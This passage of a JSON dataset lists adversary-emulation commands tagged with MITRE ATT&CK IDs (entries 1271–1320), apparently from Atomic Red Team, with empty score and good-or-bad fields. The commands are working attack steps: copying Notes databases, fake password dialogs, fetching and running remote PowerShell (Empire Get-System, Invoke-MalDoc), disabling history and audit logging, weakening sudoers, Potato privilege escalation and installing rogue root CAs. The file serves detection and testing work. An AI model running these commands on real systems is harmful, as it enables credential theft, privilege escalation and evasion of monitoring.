        "Command": "osascript -e 'tell application \"Finder\"' -e 'set destinationFolderPath to POSIX file \"/private/tmp\"' -e 'set notesFolderPath to (path to home folder as text) & \"Library:Group Containers:group.com.apple.notes:\"' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file \"NoteStore.sqlite\", file \"NoteStore.sqlite-shm\", file \"NoteStore.sqlite-wal\"} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'",
        "Description": "This command will copy Apple Notes database files using AppleScript as seen in Atomic Stealer.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1005",
        "Shell": "sh"
    },
    {
        "ID": 1271,
        "Command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename |FL\n",
        "Description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename\" /f /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.011",
        "Shell": "powershell"
    },
    {
        "ID": 1272,
        "Command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\calcservice\" /f /v ImagePath /d \"%windir%\\system32\\cmd.exe\"\n",
        "Description": "Change Service registry ImagePath of a bengin service to a malicious file\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1273,
        "Command": "cscript \"PathToAtomicsFolder\\T1059.007\\src\\sys_info.js\" > %tmp%\\T1059.007.out.txt\n",
        "Description": "JScript execution test, execute JScript via cscript command. When successful, system information will be written to $env:TEMP\\T1059.007.out.txt",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.007",
        "Shell": "command_prompt"
    },
    {
        "ID": 1274,
        "Command": "wscript \"PathToAtomicsFolder\\T1059.007\\src\\sys_info.js\"\n",
        "Description": "JScript execution test, execute JScript via wscript command. When successful, system information will be shown with four message boxes.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.007",
        "Shell": "command_prompt"
    },
    {
        "ID": 1275,
        "Command": "cscript \"PathToAtomicsFolder\\T1059.005\\src\\sys_info.vbs\" > $env:TEMP\\T1059.005.out.txt\n",
        "Description": "Visual Basic execution test, execute vbscript via PowerShell.\n\nWhen successful, system information will be written to $env:TEMP\\T1059.005.out.txt.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.005",
        "Shell": "powershell"
    },
    {
        "ID": 1276,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\"\n",
        "Description": "This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution\na message box will pop up displaying \"ART T1059.005\"\n\nA note regarding this module, due to the way that this module utilizes \"ScriptControl\" a 64bit version of Microsoft Office is required.\nYou can validate this by opening WinWord -> File -> Account -> About Word\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.005",
        "Shell": "powershell"
    },
    {
        "ID": 1277,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n",
        "Description": "This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this\nwe first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that\nmemory location to a file stored in the $env:TEMP\\atomic_t1059_005_test_output.bin.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.005",
        "Shell": "powershell"
    },
    {
        "ID": 1278,
        "Command": "export http_proxy=127.0.0.1:3128\ncurl http://google.com\n",
        "Description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1090.001",
        "Shell": "sh"
    },
    {
        "ID": 1279,
        "Command": "networksetup -setwebproxy Wi-Fi 127.0.0.1 8080\nnetworksetup -setsecurewebproxy Wi-Fi 127.0.0.1 8080\n",
        "Description": "Enable traffic redirection on macOS UI (not terminal).\nThe test will modify and enable the \"Web Proxy\" and \"Secure Web Proxy\" settings  in System Preferences => Network => Advanced => Proxies for the specified network interface.\n\nNote that this test may conflict with pre-existing system configuration.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1090.001",
        "Shell": "sh"
    },
    {
        "ID": 1280,
        "Command": "netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1",
        "Description": "Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1090.001",
        "Shell": "powershell"
    },
    {
        "ID": 1281,
        "Command": "ping -c 250 8.8.8.8 > /dev/null\nwhoami\n",
        "Description": "Uses the ping command to introduce a delay before executing a malicious payload.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1497.003",
        "Shell": "sh"
    },
    {
        "ID": 1282,
        "Command": "export HISTCONTROL=ignoreboth\nwhoami\n",
        "Description": "Disables history collection in shells\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.003",
        "Shell": "sh"
    },
    {
        "ID": 1283,
        "Command": "export HISTSIZE=0\nwhoami\n",
        "Description": "Disables history collection in shells\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.003",
        "Shell": "sh"
    },
    {
        "ID": 1284,
        "Command": "1. export HISTCONTROL=ignoreboth\n2. echo export \"HISTCONTROL=ignoreboth\" >> ~/.bash_profile\n3. ls\n4. whoami > recon.txt\n",
        "Description": "The HISTCONTROL variable is set to ignore (not write to the history file) command that are a duplicate of something already in the history \nand commands that start with a space. This atomic sets this variable in the current session and also writes it to the current user's ~/.bash_profile \nso that it will apply to all future settings as well.\nhttps://www.linuxjournal.com/content/using-bash-history-more-efficiently-histcontrol\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.003",
        "Shell": "manual"
    },
    {
        "ID": 1285,
        "Command": "cp $HISTFILE $HISTFILE.OLD\nif ((${#HISTFILE[@]})); then echo $HISTFILE; fi\necho \"\" > $HISTFILE\nif [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \"$HISTFILE is larger than 1k\"; fi\nls -la $HISTFILE \ncat $HISTFILE\nhistory -c \nif [ $(history |wc -l) -eq 1 ]; then echo \"History cache cleared\"; fi\n",
        "Description": "An attacker may clear the bash history cache and the history file as their last act before logging off to remove the record of their command line activities. \n\nIn this test we use the $HISTFILE variable throughout to 1. confirms the $HISTFILE variable is set 2. echo \"\" into it 3..5 confirm the file is empty 6 clear the history cache 7. confirm the history cache is empty. This is when the attacker would logoff.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.003",
        "Shell": "bash"
    },
    {
        "ID": 1286,
        "Command": "TEST=$(echo $HISTCONTROL)\nif [ \"$HISTCONTROL\" != \"ignoreboth\" ]; then export HISTCONTROL=\"ignoreboth\"; fi\nhistory -c \nls -la $HISTFILE # \" ls -la $HISTFILE\"\nif [ $(history |wc -l) -eq 1 ]; then echo \"ls -la is not in history cache\"; fi\nif [ \"$HISTCONTROL\" != \"erasedups\" ]; then export HISTCONTROL=\"erasedups\"; fi\nhistory -c \nls -la $HISTFILE\nls -la $HISTFILE\nls -la $HISTFILE\nif [ $(history |wc -l) -eq 2 ]; then echo \"Their is only one entry for ls -la $HISTFILE\"; fi\n",
        "Description": "An attacker may exploit the space before a command (e.g. \" ls\") or the duplicate command suppression feature in Bash history to prevent their commands from being recorded in the history file or to obscure the order of commands used. \n\nIn this test we 1. sets $HISTCONTROL to ignoreboth 2. clears the history cache 3. executes ls -la with a space in-front of it 4. confirms that ls -la is not in the history cache 5. sets $HISTCONTROL to erasedups 6. clears the history cache 7..9 executes ls -la $HISTFILE 3 times 10. confirms that their is only one command in history\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.003",
        "Shell": "bash"
    },
    {
        "ID": 1287,
        "Command": "TEST=$(echo $HISTFILESIZE)\necho $HISTFILESIZE\nexport HISTFILESIZE=0\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT\";  fi\n",
        "Description": "An Adversary may set the bash history files size environment variable (HISTFILESIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILESIZE. In this test we 1. echo HISTFILESIZE 2. set it to zero 3. confirm that HISTFILESIZE is set to zero.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.003",
        "Shell": "bash"
    },
    {
        "ID": 1288,
        "Command": "echo $HISTSIZE\nexport HISTSIZE=0\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTSIZE) -eq 0 ]; then echo \"\\$HISTSIZE is zero\"; else HIST_LENGTH=$(wc -l $HISTFILE); echo \"\\$HISTSIZE is not zero, history size is $HIST_LENGTH\";  fi\n",
        "Description": "An Adversary may set the sh history files size environment variable (HISTSIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTSIZE. In this test we 1. echo HISTSIZE 2. set it to zero 3. confirm that HISTSIZE is set to zero.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.003",
        "Shell": "sh"
    },
    {
        "ID": 1289,
        "Command": "TEST=$(echo $HISTFILE)\necho $HISTFILE\nexport HISTFILE=\"/dev/null\"\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT\";  fi\n",
        "Description": "An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.003",
        "Shell": "bash"
    },
    {
        "ID": 1290,
        "Command": "echo $HISTFILE\nexport HISTFILE=\"/dev/null\"\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi\n",
        "Description": "An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.003",
        "Shell": "sh"
    },
    {
        "ID": 1291,
        "Command": "if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='ls*:rm*:ssh*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi\nhistory -c \nls -la $HISTFILE\nls -la ~/.bash_logout\nif [ $(history |wc -l) -eq 1 ]; then echo \"ls commands are not in history\"; fi\nunset HISTIGNORE\nif ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi\nhistory -c \nwhoami\ngroups\nif [ $(history |wc -l) -eq 0 ]; then echo \"History cache is empty\"; fi\n",
        "Description": "An Adversary may take advantage of the HISTIGNORE environment variable either to ignore particular commands or all commands. \n\nIn this test we 1. set HISTIGNORE to ignore ls, rm and ssh commands 2. clear this history cache 3..4 execute ls commands 5. confirm that the ls commands are not in the history cache 6. unset HISTIGNORE variable 7.. same again, but ignoring ALL commands.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.003",
        "Shell": "bash"
    },
    {
        "ID": 1292,
        "Command": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f\n",
        "Description": "In Windows operating systems, command line auditing is controlled through the following registry value:\n\n  Registry Path: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\n  \n  Registry Value: ProcessCreationIncludeCmdLine_Enabled\n\nWhen command line auditing is enabled, the system records detailed information about command execution, including the command executed, the user account responsible for executing the command, and the timestamp of the execution.\nThis information is crucial for security monitoring and forensic analysis, as it helps organizations detect and investigate unauthorized or malicious activities within their systems.\nBy default, command line auditing may not be enabled in Windows systems, and administrators must manually configure the appropriate registry settings to activate it.\nConversely, attackers may attempt to tamper with these registry keys to disable command line auditing, as part of their efforts to evade detection and cover their tracks while perpetrating malicious activities.\n\nBecause this attack executes reg.exe using a command prompt, this attack can be detected by monitoring both:\n  Process Creation events for reg.exe (Windows Event ID 4688, Sysmon Event ID 1)\n  Registry events (Windows Event ID 4657, Sysmon Event ID 13)\n\nRead more here:\nhttps://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-220703123711.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1293,
        "Command": "New-ItemProperty -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\" -Name \"ProcessCreationIncludeCmdLine_Enabled\" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore\n",
        "Description": "In Windows operating systems, command line auditing is controlled through the following registry value:\n\n  Registry Path: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\n  \n  Registry Value: ProcessCreationIncludeCmdLine_Enabled\n\nWhen command line auditing is enabled, the system records detailed information about command execution, including the command executed, the user account responsible for executing the command, and the timestamp of the execution.\nThis information is crucial for security monitoring and forensic analysis, as it helps organizations detect and investigate unauthorized or malicious activities within their systems.\nBy default, command line auditing may not be enabled in Windows systems, and administrators must manually configure the appropriate registry settings to activate it.\nConversely, attackers may attempt to tamper with these registry keys to disable command line auditing, as part of their efforts to evade detection and cover their tracks while perpetrating malicious activities.\n\nBecause this attack runs a Powershell cmdlet, this attack can be detected by monitoring both:\n  Powershell Logging (Windows Powershell Event ID 400, 800, 4103, 4104)\n  Registry events (Windows Event ID 4657, Sysmon Event ID 13)\n\nRead more here:\nhttps://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-220703123711.html\nhttps://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-itemproperty?view=powershell-7.4#example-2-add-a-registry-entry-to-a-key\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.003",
        "Shell": "powershell"
    },
    {
        "ID": 1294,
        "Command": "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'\n",
        "Description": "Prompt User for Password (Local Phishing)\nReference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1056.002",
        "Shell": "bash"
    },
    {
        "ID": 1295,
        "Command": "# Creates GUI to prompt for password. Expect long pause before prompt is available.\\t\n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password\n",
        "Description": "Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1056.002",
        "Shell": "powershell"
    },
    {
        "ID": 1296,
        "Command": "PWD_SPOOF=$(osascript -e 'display dialog \"To perform a security update MacOS needs your passphrase.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer')\necho $PWD_SPOOF\n",
        "Description": "Prompt user for password without requiring permissions to send Apple events to System Settings.\nhttps://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1056.002",
        "Shell": "bash"
    },
    {
        "ID": 1297,
        "Command": "sudo -l\\t  \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers\n",
        "Description": "Common Sudo enumeration methods.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.003",
        "Shell": "sh"
    },
    {
        "ID": 1298,
        "Command": "sudo -l\\t  \nsudo cat /usr/local/etc/sudoers\nsudo ee /usr/local/etc/sudoers\n",
        "Description": "Common Sudo enumeration methods.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.003",
        "Shell": "sh"
    },
    {
        "ID": 1299,
        "Command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n",
        "Description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.003",
        "Shell": "sh"
    },
    {
        "ID": 1300,
        "Command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers\nsudo visudo -c -f /usr/local/etc/sudoers\n",
        "Description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.003",
        "Shell": "sh"
    },
    {
        "ID": 1301,
        "Command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"\nsudo visudo -c -f /etc/sudoers\n",
        "Description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.003",
        "Shell": "sh"
    },
    {
        "ID": 1302,
        "Command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /usr/local/etc/sudoers\"\nsudo visudo -c -f /usr/local/etc/sudoers\n",
        "Description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.003",
        "Shell": "sh"
    },
    {
        "ID": 1303,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\n",
        "Description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.001",
        "Shell": "powershell"
    },
    {
        "ID": 1304,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose\n",
        "Description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.001",
        "Shell": "powershell"
    },
    {
        "ID": 1305,
        "Command": "Start-Process \"PathToAtomicsFolder\\T1134.001\\bin\\NSudoLG.exe\" -Argument \"-U:T -P:E cmd\"\nStart-Sleep -Second 5\nStop-Process -Name \"cmd\" -force -erroraction silentlycontinue\n",
        "Description": "Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.001",
        "Shell": "powershell"
    },
    {
        "ID": 1306,
        "Command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue\n",
        "Description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.001",
        "Shell": "powershell"
    },
    {
        "ID": 1307,
        "Command": "cmd /c 'PathToAtomicsFolder\\..\\ExternalPayloads\\JuicyPotato.exe' -l '7777' -t * -p '$env:windir\\system32\\notepad.exe' -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'\n",
        "Description": "This Atomic utilizes Juicy Potato to obtain privilege escalation. \nUpon successful execution of this test, a vulnerable CLSID will be used to execute a process with system permissions.\nThis tactic has been previously observed in SnapMC Ransomware, amongst numerous other campaigns. \n[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.001",
        "Shell": "powershell"
    },
    {
        "ID": 1308,
        "Command": "sudo touch /Library/StartupItems/EvilStartup.plist\n",
        "Description": "Modify or create an file in /Library/StartupItems\n[Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1037.005",
        "Shell": "sh"
    },
    {
        "ID": 1309,
        "Command": "sudo cp $PathToAtomicsFolder/T1037.005/src/StartupParameters.plist /Library/StartupItems/StartupParameters.plist\nsudo cp $PathToAtomicsFolder/T1037.005/src/T1037.005_daemon.sh /Library/StartupItems/atomic.sh\nsudo cp $PathToAtomicsFolder/T1037.005/src/T1037_005_daemon.plist /tmp/T1037_005_daemon.plist\nsudo /Library/StartupItems/atomic.sh start\n",
        "Description": "Add launch script to /Library/StartupItems to launch agent\n[Example](https://cybersecurity.att.com/blogs/labs-research/diversity-in-recent-mac-malware)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1037.005",
        "Shell": "bash"
    },
    {
        "ID": 1310,
        "Command": "sudo cp $PathToAtomicsFolder/T1037.005/src/StartupParameters.plist /Library/StartupItems/StartupParameters.plist\nsudo cp $PathToAtomicsFolder/T1037.005/src/T1037.005_agent.sh /Library/StartupItems/atomic.sh\nsudo cp $PathToAtomicsFolder/T1037.005/src/T1037_005_agent.plist /tmp/T1037_005_agent.plist\n/Library/StartupItems/atomic.sh start\n",
        "Description": "Add launch script to /Library/StartupItems to launch agent\n[Example](https://cybersecurity.att.com/blogs/labs-research/diversity-in-recent-mac-malware)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1037.005",
        "Shell": "bash"
    },
    {
        "ID": 1311,
        "Command": "openssl genrsa -out rootCA.key 4096\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt\ncp rootCA.crt /etc/pki/ca-trust/source/anchors/\nupdate-ca-trust\n",
        "Description": "Creates a root CA with openssl\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.004",
        "Shell": "sh"
    },
    {
        "ID": 1312,
        "Command": "openssl genrsa -out rootCA.key 4096\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt\ncp rootCA.crt /usr/local/share/certs/\ncertctl rehash\n",
        "Description": "Creates a root CA with openssl\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.004",
        "Shell": "sh"
    },
    {
        "ID": 1313,
        "Command": "mv rootCA.crt /usr/local/share/ca-certificates\nsudo update-ca-certificates\n",
        "Description": "Creates a root CA with openssl\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.004",
        "Shell": "sh"
    },
    {
        "ID": 1314,
        "Command": "sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"rootCA.crt\"\n",
        "Description": "Creates a root CA with openssl\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.004",
        "Shell": "sh"
    },
    {
        "ID": 1315,
        "Command": "$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My\nMove-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"\n",
        "Description": "Creates a root CA with Powershell\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.004",
        "Shell": "powershell"
    },
    {
        "ID": 1316,
        "Command": "certutil -addstore my $env:Temp\\rootCA2.cer\n",
        "Description": "Creates a root CA with certutil\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.004",
        "Shell": "powershell"
    },
    {
        "ID": 1317,
        "Command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n",
        "Description": "The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.004",
        "Shell": "powershell"
    },
    {
        "ID": 1318,
        "Command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nRemove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n",
        "Description": "Copies and deletes mail data on Windows\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.008",
        "Shell": "powershell"
    },
    {
        "ID": 1319,
        "Command": "mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ \"$(basename \"$file\")\" != \"copy\" ]; then cp -R \"$file\" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*\n",
        "Description": "Copies and deletes mail data on Linux\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.008",
        "Shell": "bash"
    },
    {
        "ID": 1320,
        "Command": "mkdir ~/Library/Mail/copy\ncp -R ~/Library/Mail/* ~/Library/Mail/copy\nrm -rf ~/Library/Mail/copy/*\n",
        "Description": "Copies and deletes mail data on macOS\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.008",
        "Shell": "bash"
    },
    {
        "ID": 1321,
